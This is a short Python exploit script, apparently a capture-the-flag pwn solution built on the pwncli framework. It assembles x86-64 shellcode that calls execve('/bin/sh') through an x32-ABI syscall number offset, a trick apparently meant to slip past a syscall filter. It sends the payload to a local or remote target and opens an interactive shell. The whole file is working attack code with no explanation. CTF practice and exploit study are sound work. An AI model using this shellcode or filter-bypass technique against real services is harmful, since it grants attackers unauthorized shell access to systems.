#!/usr/bin/env python3
# Date: 2025-07-04 21:09:22
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)



rl()
code_addr=0x4040c0
code=asm('''
         /* execve("/bin/sh", 0, 0) */
         mov rax,59
         add rax,0x40000000
         mov rdi,0x404140
         mov rsi,0
         mov rdx,0
         syscall

''')

code=code.ljust(0x80)
code+=b'/bin/sh\x00'

s(code)

ia()
